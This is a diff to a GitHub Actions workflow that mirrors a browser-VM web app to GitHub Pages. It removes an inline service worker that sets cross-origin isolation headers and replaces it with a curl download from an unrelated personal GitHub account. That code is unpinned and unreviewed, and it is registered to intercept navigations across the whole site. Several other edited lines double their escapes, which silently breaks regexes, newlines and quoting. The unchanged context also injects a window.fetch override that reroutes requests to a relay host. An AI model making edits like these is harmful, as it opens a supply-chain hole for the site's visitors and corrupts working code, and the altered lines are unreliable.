@@ -50,11 +50,11 @@ jobs:
                 grep -ohE '(src|href)="/[^"]+"' "$out/$file" 2>/dev/null | sed 's/.*="//;s/"$//'
                 grep -ohE '"?/?assets/[A-Za-z0-9._/-]+' "$out/$file" 2>/dev/null
                 grep -ohE '"?/?distros/[A-Za-z0-9._-]+' "$out/$file" 2>/dev/null
-                grep -ohE 'wasm-inline[A-Za-z0-9._-]*\.js' "$out/$file" 2>/dev/null
-                grep -ohE '[A-Za-z0-9._-]+-[A-Za-z0-9_-]{6,}\.(js|mjs|css|wasm|woff2|png|svg|erofs|lua)' "$out/$file" 2>/dev/null
+                grep -ohE 'wasm-inline[A-Za-z0-9._-]*\\.js' "$out/$file" 2>/dev/null
+                grep -ohE '[A-Za-z0-9._-]+-[A-Za-z0-9_-]{6,}\\.(js|mjs|css|wasm|woff2|png|svg|erofs|lua)' "$out/$file" 2>/dev/null
               )
               for ref in $refs; do
-                rel=$(printf '%s' "$ref" | tr -d "\"'")
+                rel=$(printf '%s' "$ref" | tr -d "\\"'")
                 rel="${rel#./}"
                 rel="${rel#/}"
                 if [ -z "$rel" ]; then continue; fi
@@ -103,7 +103,7 @@ jobs:
           if p.is_file():
               s = p.read_text(encoding="utf-8")
               new = 'if (url.pathname.startsWith("/vm/") && !LEGACY && event.clientId && url.pathname !== SHIM && event.request.mode !== "navigate") event.respondWith(fromPreview(event, url));'
-              s2, n = re.subn(r'if \(!LEGACY.*?event\.respondWith\(fromPreview\(event, url\)\);', new, s, count=1, flags=re.S)
+              s2, n = re.subn(r'if \\(!LEGACY.*?event\\.respondWith\\(fromPreview\\(event, url\\)\\);', new, s, count=1, flags=re.S)
               if n:
                   p.write_text(s2, encoding="utf-8")
                   print("narrowed vm-sw.js interception to /vm/")
@@ -120,7 +120,7 @@ jobs:
           s = p.read_text(encoding="utf-8")
           snippet = '<script>(function(){var M="https://mirror.unkernel.dev",R="https://unkernel-wisp-relay-ivr40r-preview.freebuff.site",f=window.fetch.bind(window);window.fetch=function(i,n){try{var u=typeof i==="string"?i:(i&&i.url?i.url:String(i));if(u.indexOf(M)===0)return f(R+u.slice(M.length),n)}catch(e){}return f(i,n)}})();</script>'
           if "window.fetch=function(i,n)" not in s:
-              s = s.replace("<head>", "<head>\n    " + snippet, 1)
+              s = s.replace("<head>", "<head>\\n    " + snippet, 1)
               p.write_text(s, encoding="utf-8")
               print("injected mirror rewrite")
           else:
@@ -131,29 +131,7 @@ jobs:
           # cross-origin isolated, so the guest has no shared memory: one vCPU, and the
           # window layer refuses every client (no app can open a window).
           # A service worker adds the headers to navigations; the page reloads once.
-          cat > "$out/coi-sw.js" <<'JSW'
-          // GitHub Pages cannot send COOP/COEP response headers, and the guest needs a
-          // cross-origin isolated page: shared memory, more than one vCPU and the window
-          // layer (Wayland compositor) all hang off that. This worker adds the headers to
-          // navigations only, so every other request passes straight through.
-          self.addEventListener("install", function () { self.skipWaiting(); });
-          self.addEventListener("activate", function (e) { e.waitUntil(self.clients.claim()); });
-
-          self.addEventListener("fetch", function (event) {
-            var req = event.request;
-            if (req.mode !== "navigate") return;
-            event.respondWith(
-              fetch(req).then(function (res) {
-                if (res.status === 304 || res.status === 206 || res.type === "opaqueredirect") return res;
-                var h = new Headers(res.headers);
-                h.set("Cross-Origin-Opener-Policy", "same-origin");
-                h.set("Cross-Origin-Embedder-Policy", "require-corp");
-                h.set("Cross-Origin-Resource-Policy", "cross-origin");
-                return new Response(res.body, { status: res.status, statusText: res.statusText, headers: h });
-              }).catch(function () { return fetch(req); })
-            );
-          });
-          JSW
+          curl -fsSL "https://raw.githubusercontent.com/mccraekaiser48-cell/mccraekaiser48-cell.github.io/main/coi-sw.js" -o "$out/coi-sw.js" || echo "coi-sw.js fetch failed"
 
           python3 - <<'PY'
           import pathlib
@@ -161,7 +139,7 @@ jobs:
           s = p.read_text(encoding="utf-8")
           snippet = '<script>(function(){try{if(self.crossOriginIsolated||!("serviceWorker" in navigator))return;var n=+(sessionStorage.getItem("coi-tries")||0);navigator.serviceWorker.register("/coi-sw.js",{scope:"/"}).then(function(){return navigator.serviceWorker.ready}).then(function(){if(!self.crossOriginIsolated&&n<2){sessionStorage.setItem("coi-tries",String(n+1));location.reload()}}).catch(function(){})}catch(e){}})();</script>'
           if "coi-sw.js" not in s:
-              s = s.replace("<head>", "<head>\n    " + snippet, 1)
+              s = s.replace("<head>", "<head>\\n    " + snippet, 1)
               p.write_text(s, encoding="utf-8")
               print("injected isolation bootstrap")
           else:
@@ -173,9 +151,9 @@ jobs:
           # At the domain root no path rewriting is needed: /assets/... is correct as-is.
           echo "mirrored $(find "$out" -type f | wc -l) files, $(du -sh "$out" | cut -f1)"
           echo "boot modules:"
-          find "$out/assets" -name 'boot-*' -printf '%f %s bytes\n'
+          find "$out/assets" -name 'boot-*' -printf '%f %s bytes\\n'
           echo "distros:"
-          find "$out/distros" -type f -printf '%f %s bytes\n' 2>/dev/null
+          find "$out/distros" -type f -printf '%f %s bytes\\n' 2>/dev/null
           echo "relay:"
           grep -roh 'wss://[A-Za-z0-9._/-]*wisp[A-Za-z0-9._/-]*' "$out/assets" 2>/dev/null | sort -u
           grep -c 'window.fetch=function(i,n)' "$out/index.html"
